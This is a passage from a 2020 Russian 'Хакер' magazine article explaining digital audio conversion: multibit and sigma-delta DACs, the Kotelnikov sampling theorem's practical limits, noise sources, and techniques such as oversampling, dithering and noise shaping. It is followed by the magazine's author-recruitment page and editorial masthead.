тивоборствующих лагерей: маркетологов, аудиофилов и скептиков. Давай
разберемся, в чем тут дело.


Мультибитные ЦАП
Вначале, когда только появился формат Audio CD, PCM преобразовывали
в аналоговый сигнал при помощи мультибитных ЦАП. Они были построены
на основе резистивной матрицы постоянного импеданса, так называемой
матрицы R‐2R.





                Упрощенная схема мультибитного ЦАП

Мультибитные ЦАП работа ют так: поток PCM раз деляется на два канала,
левый и правый, и переводится из последова тельного представления сиг‐
нала в параллельное — например, при помощи сдвиговых регистров.
В буфер одного регистра записываются данные правого канала, а в буфер
другого — данные левого. Данные переда ются одновременно по парал лель‐
ным портам с заданной час тотой дискретиза ции (чаще всего 44,1 кГц), как на
изображении ниже, толь ко параллельных выходов не восемь, а шес тнадцать,
потому что разрядность 16 бит. В зависимости от положения в кадре старшие
и младшие биты будут встречать на пути следования электричес кого тока раз‐
ное сопротивление, пос кольку разным будет количес тво последовательно
подклю ченных резисторов. Чем старше бит, тем больше должна быть его зна‐
чимость.





Мультибитные ЦАП, или мультибиты, требуют очень качественных компонен‐
тов и точной подгонки резисторов, ведь любые неточности в номиналах ком‐
понентов суммируются. Это приводит к серьезным отклонениям от исходной
волны и создает погрешность в несколько разрядов квантования.
  В мультибитных ЦАП восьмидесятых годов нет никаких манипу ляций
с PCM. Мультибиты под клю чаются нап рямую к шине I2S и проигры вают PCM
как есть: пришли данные правого канала (16 бит), подождал данные второго
канала (16 бит), выдал оба канала на резистивную матрицу — и так с час‐
тотой 44,1 кГц.
  В восьмидесятые годы частота и разрядность определялись форматом
СDDA, который стал практически эталонной реализаци ей теоремы Котель‐
никова. С некоторыми ого ворками так можно охарактеризовать и более поз‐
дний MP3. Только начиная с формата DVD Audio был пересмотрен подход
к оцифровке и воспроизведению зву ка.
   Так работали простейшие первые ЦАП, позднее стали использовать пре‐
образователи с более сложным устройством. Схемы модернизировали,
качество компонентов улучшалось, а еще в мультибитных ЦАП стали при‐
менять технологию oversampling. Oversampling — это передискретизация
цифрового потока с повышением частоты дискретизации и разрядности
квантования для уменьшения шума квантования.
   Чтобы объяснить, зачем используется oversampling, необходимо расска‐
зать о применении теоремы Котельникова на практике. Здесь все не так
радужно, как представляется в мире матема тики, — ни о каком «с любой точ‐
ностью», как написано в теореме, и речи не идет.


Теорема Котельникова


    «Любую фун кцию F(t), состоящую из частот от 0 до f , мож но                                                        1
    непрерывно передавать с любой точ ностью при помощи
     чисел, сле дующих друг за дру гом через 1/(2f ) секунд»                                                  1

Следствия теоре мы Котельникова:
 • любой аналоговый сигнал может быть восста новлен с какой угодно точ‐
   ностью по своим дискретным отсчетам, взя тым с частотой f > 2fc, где fc —
   максимальная частота, которая ограничена спектром реального сигнала;
 • если максимальная частота в сиг нале равна полови не частоты дис кре‐
   тизации (наложе ние спектра) или превышает ее, то способа восстановить
   сигнал из дискретного в ана логовый без искажений не существует.

Если тебя интересуют подробности, можешь обра титься к первоисточнику —
работе «О пропускной способности „эфира“ и про волоки в электросвязи»
авторства В. А. Котельникова (PDF).





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
     НЕ ПУСТОЙ ЗВУК
                     РАЗБИРАЕМСЯ, КАК УСТРОЕНО
                ЦИФРОВОЕ КОДИРОВАНИЕ ЗВУКА





Сложности с теоремой Котельникова
Часто теоре му Котельникова воспринима ют слиш ком буквально и воз водят
в абсолют. Сколько я прочитал статей твердолобых скептиков о чудесных
форматах MP3 и CDDA и о безумных аудиофилах, которые впаривают всем
свои ненужные DVD‐Audio и DSD! Конечно же, главным аргументом у них выс‐
тупает теорема Котельникова.
   Начнем  с  того,  что  час тоты Най квиста  на  практике  недостаточно
для передачи точ ной формы волны. Из‐за неидеальных условий неизбежно
появляются шумы и иска жения: шумы квантования при записи звукового сиг‐
нала, шумы округле ния при его обра ботке и воспроизведении и не только.
Принято считать, что шумы квантования не могут быть меньше половины
младшего разряда квантования. Это обусловлено тем, что при квантовании
звукового сигнала делается округление до бли жайшего разряда, в большую
или меньшую сто рону. Шумы округления также не могут быть меньше полови‐
ны младшего разряда, или, как его еще называют, шага квантования. Есть
еще собственные шумы АЦП и ЦАП, но для них сложно привести точную циф‐
ру, ведь на них влияет большое количество факторов: конкретная реали‐
зация, количество и качес тво компонентов и даже окру жающая среда. Обыч‐
но собственные шумы составляют несколько разрядов квантования.
  Из этого следует, что час тота дискретизации должна быть значительно
выше частоты Найквиста, чтобы ком пенси ровать потери при оцифровке
и последующем воспроизведении цифровой записи.





Приведу пример из конспекта лекций Э. И. Вологдина «Стандарты и системы
цифровой звукозаписи»:



      Как вид но, пока пиковое зна чение вход ного сигнала не пре выша-
      ет 0,5 кванта, выход ной сигнал квантовате ля равен нулю, то есть име-
      ет мес то центральная отсечка. Это приводит к нелинейнос ти пре обра-
      зова ния и воз никновению больших иска жений при малых амплитудах
      ЗС. Пока зна чение A > 1,5, выход ной сигнал демоду лятора пред став-
      ляет собой пос ледова тельность прямоугольных импульсов, у которых
      с изме нением уров ня ЗС меняется длительность. Это обус ловле но
     ошибками квантования, которые соиз меримы с амплитудой вход ного
      сигнала. Иска жения начина ют заметно уменьшаться только при A > 2.

За А взята амплитуда сигнала.
  В приведенной цитате речь идет только о шуме квантования, причем взято
минимально возможное значение — 1/2 шага квантования. Шумы округления
оказывают примерно такое же влияние — минимум 1/2 шага квантования.
  Кроме шумов, в цифровой записи могут появляться искажения, вызванные
использованием ФНЧ — филь тра низких час тот. По теоре ме Котельникова
необходимо ограничить частоту звуково го сиг нала фильтром и принять ее
за верхнюю гранич ную, из которой потом умно жением на два вычис ляют час‐
тоту Найквиста. Проб лема в том, что в теореме рассматривается идеальный
ФНЧ, которых в реальном мире не бывает. Приведу цитату из того же кон‐
спекта лекций Вологдина:



      Для надежного подав ления спек тральных сос тавляющих выше час тоты
     Найквис та антиэлайзинговый ФНЧ должен иметь час тоту сре за нес-
      колько ниже час тоты Найквис та и очень сильно (не меньше 90 дБ)
      подав лять сос тавляющие спек тра сигнала на этой час тоте. Обыч но
      это эллиптичес кие фильтры 7...9 поряд ков. Высокая кру тиз на сре за
     ФНЧ приводит к спе цифичес ким иска жениям в виде «звона». Это свя-
      зано с тем, что отклик на импульсное воз действие такого фильтра
      описыва ется осциллирующей функцией вида sinс (v). Чем выше кру-
      тиз на сре за ФНЧ, тем мед леннее происходит затуха ние зву ковых
      колеба ний. Единс твенным способом борьбы с этими иска жениями
      является повыше ние час тоты выборок. Это поз воляет уменьшить кру-
      тиз ну спа да антиэлайзингового ФНЧ без уменьшения эффектив ности
      подав ления спек тральных сос тавляющих выше час тоты Найквис та.

Рассмотрю еще один интересный момент. В теореме Котельникова при‐
водится бесконечный по времени сигнал, что про тиворечит условиям записи
на носитель или в файл.



      Те оре ма Котельникова дает пре дельные соотношения для иде али-
      зированных условий, сре ди которых сле дует отме тить огра ниченность
      спек тра по час тоте и бес конеч ное вре мя наблюдения. Все реальные
      сигналы конеч ны во вре мени и име ют неограниченный по час тоте
       спектр. Использование модели с огра ниченным спек тром и конеч ное
      вре мя наблюдения приводят к погрешнос ти при вос ста нов лении неп-
      рерыв ного сигнала.
      Рас четы показы вают, что на прак тике час тота F  сущес твенно пре-                                              Д
     выша ет час тоту дис кре тиза ции по Котельникову» (здесь F — это час-                                                     Д
      тота дис кре тиза ции).

Источник — И. П. Ястребов «Дискретизация непрерывных сигналов во вре‐
мени. Теорема Котельникова» (PDF)
   Чтобы обрисовать масштаб проблемы, приведу еще одну цитату.



     Ис кажения, выз ванные ошибками  квантования,  уве ренно  заметны
      на  слух уже при  восьмираз рядном кодировании,  хотя при этом
      величина иска жений не пре выша ет 0,5%. Это зна чит, что при шес-
      тнад цатираз рядном  кодировании,  используемом  при  записи  CD,
      реальный динамичес кий диапа зон циф рового  зву ка не пре выша-
      ет 48 дБ, а не 96 дБ, как это пишется в рек ламе».

Источник — Э. И. Вологдин «Цифровая звукоза пись» (PDF)


Выводы
Теорема Котельникова математичес ки верна, но для практичес кого ее при‐
менения тре буется существенная коррекция. И частоту Найквиста можно
обозначить скорее как минимально допус тимую для вос становления приб‐
лизительной формы волны, но никак не для восстановления сигнала «с любой
точностью». Для компенсации потерь при оцифровке и воспроизведении час‐
тота дискретизации должна быть не в два, а как минимум в нес колько раз
выше верхней граничной частоты.
  На этом оставим в покое теорему Котельникова и перейдем к изучению
различных шумов при записи, сведении и вос произведении звукового сиг‐
нала.


ШУМЫ
Существует  множество  видов  шумов,  влияющих  на  запись.  Приведу
основные: шум квантования, шум округления, дрожание апертуры, нелиней‐
ные искажения, аналого вый шум. Можешь поз накомиться с описаниями
четырех типов шумов и формулами, чтобы примерно понять, сколько иска‐
жений в оцифрованный сиг нал вносит каждый вид.
  Не стоит воспринимать термин «шум» как проявление именно знакомого
всем «белого шума». Раз ные виды шумов вос принимаются по‐разному,
в данном контексте термин «шум» скорее нужно понимать как потерю части
полезного сигнала.
  Примерно рассчитать отдельный вид шума еще можно, но общий уровень
шумов при оцифровке — едва ли. Это очень сложная математическая модель
с множеством допущений. Попробуем пойти от обратного и проанализи‐
ровать динамический диапазон записанного сигнала на АЦП (аналого‐циф‐
ровом преобразователе) и сравнить его с теоретичес ки возможным.
   Уровень шума обычно рас считыва ют по отношению к шагу квантования
(один разряд) или к динамичес кому диапазону зву кового сигнала. Динами‐
ческий диапазон измеряется в децибелах, рассчитать его можно по формуле:
         NDR = 20lg(2  ), где N — раз рядность квантования. Получается для 16 бит воз‐
можный динамический диапазон около 96 дБ, а для 24 бит около 144 дБ.
   Возьму результаты тестирования АЦП «Lynx Studio Hilo TB», это студийный
АЦП/ЦАП высшей ценовой категории. Он показал следующие результаты.


 Ре жим работы                 24 бит, 44 кГц

 Динамический диапазон, дБ (А)          119,3              Отлично

А вот результаты без усиления.


 Ре жим работы                 24 бит, 44 кГц

 Динамический диапазон, дБ (А)          112,6              Отлично

Забегая вперед, скажу, что в тестируемом АЦП используются технологии
дитеринг (Dithering), нойз‐шейпинг (Noise shaping), а также децимация, что
позволяет расширить динамический диапазон и снизить уровень шума. Под‐
робнее про эти тех нологии рас скажу в следующем пункте.
  А теперь прикинем: 24 бита равняются 144 дБ — это возможный динами‐
ческий диапазон. От 144 дБ отнимем реаль ный динамичес кий диапа‐
зон 119 дБ, потери от шумов сос тавят лучшем случае 25 дБ, а в худшем 32 дБ.
К сожалению, при 16 бит его не тестировали, но в соотношении результаты
должны быть еще хуже, пос кольку понижение раз рядности неминуемо при‐
водит к росту шумов. Получается, что примерно 1/5 часть сигнала просто
теряется из‐за шума.
   Складывается далеко не радужная картина. А если копнуть  глубже
и учесть, как звук сводят на студии записи, ста новится не по себе. Как пра‐
вило, готовое произведение сводят из семплов, в которых уже и так присутс‐
твуют указанные шумы, поскольку семплы записа ны на подобном АЦП. Затем
добавляют эффекты, которые как минимум при водят к передискретизации
(resampling) и связанным с ней ошибкам округления.
  Кроме того, пло хие звукорежиссеры очень любят все пожать и выровнять,
используя лимитеры и компрес соры, прин цип работы которых основан
на уменьшении динамичес кого диапа зона. Через все эти пытки проходит
практически каждый семпл. Даже при использовании прос того эквалайзера
сигнал проходит через цифровой филь тр, который вносит шум округления
как минимум в пол шага квантования. При конечном сведении все семплы
собираются в один  поток, соот ветс твенно шумы каждого добавляются
к шумам еще одной передискретиза ции. Но и это еще не все — при вос про‐
изведении ЦАП добавляет собственные шумы и шум округления. Представ‐
ляешь, что на самом деле оста ется от полезного сигнала?


Методы борьбы с шумами
Чтобы исправить это пла чевное положение, были разработаны специальные
технологии борьбы с шумами. Давай рас смотрим самые основные.


Oversampling
Технологию oversampling стали применять еще во времена мультибитных ЦАП
для компенсации потерь, вызванных шумами. Принцип работы oversampling
заключается в том, что к уже существующим дис кретным отсчетам добав‐
ляются промежуточ ные, которые повторя ют приб лизительную форму вол ны.
Промежуточные отсчеты либо рассчитываются с применением математичес‐
кой интерполяции, либо заполняются нулевы ми значениями и передаются
на цифровой фильтр. Обычно и тот и другой подход называют интерполяци‐
ей, а цифровой фильтр называют интерпо лирующим. Самым простым спо‐
собом интерполяции является линейная интерпо ляция, а самым простым
цифровым фильтром может выступать филь тр нижних час тот.
  Ниже — иллюстрация алго ритма интерполяции дискретного сигнала
с коэффициентом 2. Красные точки обозначают исходные отсчеты сигнала,
сплошные линии — непрерывный сигнал, представлением которого эти
отсчеты являются. Сверху — исходный сигнал. В середине — этот же сигнал
со вставленными нулевыми отсчетами (зеленые точки). Снизу — интерпо‐
лированный сигнал (синие точки — интерполированные значения отсчетов).





Сначала стали применять только передискретиза цию с повыше нием час тоты,
например с 44,1 до 176,4 кГц. Поз днее применяли уже передискретизацию
с повышением частоты дискретиза ции и увеличением разрядности кван‐
тования — этот процесс называется реквантование.
   Хотя oversampling вносит шум округления, все же при его использовании
благодаря расширению динамичес кого диапа зона сигнала снижается общая
плотность шума, и последующая обра ботка сиг нала окажет уже меньшее вли‐
яние. Каждое удвоение час тоты дискретиза ции расширяет динамичес кий
диапазон примерно на один шаг квантования — 6 дБ — минус шум округле‐
ния.
   Как раз для возможнос ти применить oversampling стали выпускать мик‐
росхемы мультибитных ЦАП, поддержи вающие на входе цифровой поток
до 192 × 24. Также появились аппа ратные апсемплеры на основе DSP (digital
signal processor).
  Конечно, применение технологии oversampling давало улучшение харак‐
теристик звукового сигнала, но кардинально ситу ацию не меняло: уровень
шума все рав но оставался высоким. Поэтому стали при меняться и другие
технологии.


Децимация
Для записи и сведения звукового сигнала начали использовать децимацию —
это обратный процесс, передискретиза ция с понижением час тоты дискре‐
тизации и разрядности квантования. Сигнал записы вается с высокой час‐
тотой    дискретизации    и    разрядностью    квантования,    нап‐
ример 176,4 или 192 кГц с раз рядностью 24 бит, и при помощи удаления час‐
ти отсчетов цифровым филь тром «сжимает ся» до стандарта CDDA —
44,1 кГц, 16 бит. Этот подход поз воляет немного снизить уровень шума кван‐
тования.
  Ниже — иллюстрация алго ритма децимации дискретного сигнала с коэф‐
фициентом 2. Красные точки обозначают отсчеты, сплошные линии — неп‐
рерывный сигнал, представлением которо го эти отсчеты являются. Сверху —
исходный сигнал. В середине — этот же сигнал после фильтрации в циф‐
ровом фильтре нижних частот. Снизу — децимированный сигнал.





Dithering
Dithering  (дитеринг) —  метод  подмешивания  псевдослучайного шума
при оцифровке или воспроизведении зву кового сигнала. Эта технология
выпол няет две задачи:
 • линеаризация переда точной функции квантователя/реквантовате ля;
 • декорреляция ошибок квантования.

Шумы квантования имеют корреляцию, то есть взаимос вязь с основным сиг‐
налом. Это создает паразитные гармоники, которые повторяют форму сиг‐
нала. Они влияют на восприятие, создавая ощу щение «нечеткости» звучания.
Корреляцию можно убрать, добавляя специально смоделированный шум
в основной сигнал, — таким обра зом коррелиро ванный шум квантования
превращается в обычный белый шум. Это немного поднимает общий
шумовой уровень, но хорошо ска зывается на восприятии.





       Дитеринг на примере обработки изоб ражений: до и после


Noise shaping (нойз-шейпинг)
Технология noise shaping (NS) позволяет зна читель но уменьшить шум, вно‐
симый при квантовании, реквантовании и дитеринге.
  Нойз‐шейпинг работает так: квантованный сиг нал на входе сравнивается
с сигналом на выходе рекванто вателя, формируется разница (ошиб ка),
которая вычитается из основно го сигнала. Тем самым компенси руются иска‐
жения, внесенные реквантователем и в процессе дитеринга. Образуется так
называемая обратная связь, которая стремится компенсировать ошибку
на входе и выходе рекванто вателя. Эта технология работает подобно отри‐
цательной обратной связи на операционном усилителе, только все пре обра‐
зования происходят в цифровом виде.





  Здесь приведена схема реквантователя первого порядка, но, как пра‐
  вило, используются реквантователи вплоть до 9–12‐го порядка

У этой технологии есть свои минусы. Применение NS вносит большое
количество шумов в область высоких час тот, поэтому необходимо применять
фильтр низких частот, с частотой среза, близкой к верхней граничной час‐
тоте. На практике вместе с NS всегда при меняют еще и дитеринг, результат
их совместной работы намного лучше на слух.


Dynamic Element Matching
Dynamic Element Matching (DEM) — технология, которая формирует на выходе
ЦАП несколько уровней сигнала. Она похожа на нечто среднее между одно‐
битным и мультибитным ЦАП. DEM слу жит для снижения детерминированных
ошибок при использовании сигма‐дельта‐модуля ции (SDM). Эти ошибки,
подобно шумам квантования, силь но коррелированы с сигналом на выходе
однобитного модулятора, поэто му зна чительно влияют на восприятие зву‐
кового сигнала.
   Также эта технология снижает требова ния к ана логовому фильтру, потому
что форма сигнала еще до филь тра ции приб лижа ется к форме вос произво‐
димой волны. DEM реализуется при помощи нес коль ких выводов, соединен‐
ных в общую шину, которые формиру ют выходной сигнал ЦАП.





Кроме рассмотренных, применя ются и дру гие технологии, а также их сочета‐
ния и вариации. Особенно производители любят экспериментировать с циф‐
ровой фильтрацией и модуляторами, изоб ретая все новые и новые цифровые
фильтры, влияющие на сигнал как в лучшую, так и в худшую сторону. Алгорит‐
мы обработки цифрового сигнала современных ЦАП, как правило, сложны
и включают все перечис ленное, а также собс твенные наработки произво‐
дителей. Разуме ется, производители не пуб лику ют алгоритмы фильтров
и модуляторов, в лучшем случае приводят примерную блок‐схему. Так что
остается только предполагать, что на самом деле происходит со звуковым
сигналом внутри того или иного цифроана логового преобразователя.


Сигма-дельта-преобразователи
Сигма‐дельта цифроаналоговые преобра зова тели  раз вивались обособ‐
ленно от мультибитных ЦАП. За основу была взя та, как понятно из названия,
сигма‐дельта‐модуляция, в литературе она обычно обозначается аббре‐
виатурой SDM. В сигма‐дельта‐модуляции передается не абсолютное зна‐
чение амплитуды сигнала за единицу времени, как в мультибитных ЦАП,
а изменения сигнала относительно предыду щего зна чения. Так, если ампли‐
туда возрастает, переда ется 1, а если падает — 0. Подобный принцип уже
был описан в разделе про DSD.





Первые сигма‐дельта‐ЦАП были полностью однобитными, но за счет высокой
частоты дискретизации обеспечивали динами чес кий диапазон на уровне
примерно 129 дБ. За основу взяли час тоту дискретизации 44,1 кГц. Веро‐
ятно, выбранная частота поз воляла экономить аппаратные ресурсы благода‐
ря упрощению вычислений при интерполяции.
  Сначала использовали частоту  2,8 МГц, это  44,1  кГц, увеличенная
в 64 раза. Сейчас частота может быть раз ной, она определяется внутренней
архитектурой самого ЦАП. Обычно она основана на час тотных сетках, крат‐
ных 44,1 кГц и 48 кГц, с множителем 64, 128, 256, 512, 1024.
  Со временем дельта‐сигма‐ЦАП практичес ки полностью вытеснили муль‐
тибитные, просто по экономичес ким причинам. Во‐первых, их тре бования
к качеству и точ ности компонентов гораздо ниже, чем у мультибитных ЦАП,
соответственно, и себес тоимость ниже. Во‐вторых, в восьмидесятые —
девяностые годы стоимость реализации интерполяции и  noise  shaping
для однобитного модулятора была существенно меньше, чем для 16 бит.
Сейчас, с развитием технологий, это не так критично, и многие сигма‐дель‐
та‐ЦАП имеют, подоб но мультибитам, нес коль ко уровней на выходе. Но за
счет многократного увеличения час тоты требования к компонентам остаются
не очень высокими, поэто му первое преимущес тво сохраняется и по сей
день.
  Современные сигма‐дельта‐ЦАП имеют сложную структуру и включают
в себя практически все технологии, перечисленные в предыду щей главе.
Приведу пример внутренней структуры одно го из простых сигма‐дельта‐ЦАП
из лекций Вологдина.





      Вход ные циф ровые 16-раз рядные выбор ки с час тотой дис кре тиза-
      ции 44,1 кГц пода ются на вход циф рового фильтра передис кре тиза-
      ции. В схе ме используется нерекур сивный с четырехкратной передис-
      кре тиза цией FIR  (finite impulse response) интерполяционный фильтр
      с линейной фазовой харак терис тикой. На пер вом эта пе модуляции
      в результате перек вантования чис ло раз рядов в выбор ках понижа ется
      с 16 до 14 и используется SDM 1-го поряд ка.
     За тем еще раз производится передис кре тиза ция c помощью двух сту-
      пеней (Kos = 32 и  2). Между этими сту пенями в тракт вводится
     шумовой сигнал, осу ществляющий опе рацию «Dithering» с уров нем
      шума, рав ным минус 20 дБ. Она уменьшает нелинейность переда точ-
      ной  функции  из‑за  ошибок  квантования.  Общий  коэф фициент
      передис кре тиза ции равен 256, и час тота дис кре тиза ции уве личивает-
      ся до 11,29 МГц. Во второй сту пени модуляции используется SDM 2-
       го поряд ка и фор миру ется однораз рядный циф ровой поток. К выходу
     ЦАП под клю чается вре мя‑импульсный циф ровой модулятор, пре обра-
     зующий циф ровые данные в пос ледова тельность импульсов, модули-
      рованных по плотности (PDM).

Если обобщить и упростить, про исходит примерно следующее. На вход ЦАП
подается поток данных PCM через разъем I2S, подвергается интерполяции
(oversampling), далее добавляется шум (dithering), и затем поток подается
на реквантователь с обратной связью (noise shaping). В конце формиру ется
однобитный поток, он про ходит через аналоговый фильтр нижних частот, где
уже и получается конечный звуковой сигнал, который мы слышим.
  Многоразрядный ЦАП устроен слож нее: кроме перечисленного, в нем
используется еще и технология DEM.





        WWW

                      Если хочешь разобраться  в  деталях, почитай
                      материалы по ссылкам, там есть информация
                      не  только о  сигма‐дельта‐ЦАП, но и о  сиг‐
                       ма‐дельта‐АЦП.
                       •Статья      о       дельта‐сигма‐модуляции
                         на microsin.net
                     •Конспект  лекций  Э.  И.  Вологдина  по  сиг‐
                         ма‐дельта‐модуля ции


Современные цифроана логовые преобразователи — устрой ства сложные.
Но применение этих технологий необходимо для искусс твенного расширения
динамического диапазона, и по большому счету они используются, чтобы
преодолеть ограничения форматов CDDA и MP3. Если бы записи изначально
выпускали в высоком раз решении PCM (192 × 24), а лучше в формате DSD, то
не пришлось бы применять так много технологий и сложных цифровых пре‐
образований. В случае с DSD вмешательство в квантованный сигнал и вовсе
не нужно, по крайней мере при вос произведении.


ЗАКЛЮЧЕНИЕ
Путь развития звукозаписи и воспроизведения в цифровую эпоху был неп‐
ростым и тернистым. С изобретением компакт‐дисков все го за пару десяти‐
летий звук на аналоговых носителях практически прекратил свое существо‐
вание. Хорошо это или пло хо — каждый реша ет для себя, но хотелось бы,
чтобы оставалась сама воз можность выбора. Если не между цифрой и ана‐
логом, то хотя бы как и в каком качес тве слушать любимую музыку. К сожале‐
нию, сейчас этого выбора почти нет. Сей час мало кто выпус кает музыку
в высоком разрешении, кроме энту зиас тов на трекерах. Винить в этом можно
разве что студии звукоза писи, которые решили огра ничиться единственным
форматом — CDDA.
  Остается только посочувствовать музыкантам! Сколько сил и времени они
тратят на создание музыки, но их труд даже не сохраня ется в достойном
качестве. Выходом могла бы стать запись на мастер‐ленту или хотя бы в DSD.
Но звукозаписывающие сту дии не ста нут тратить лишние усилия, ведь их
устраивает текущее положение вещей.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №07 (256)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                         РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2020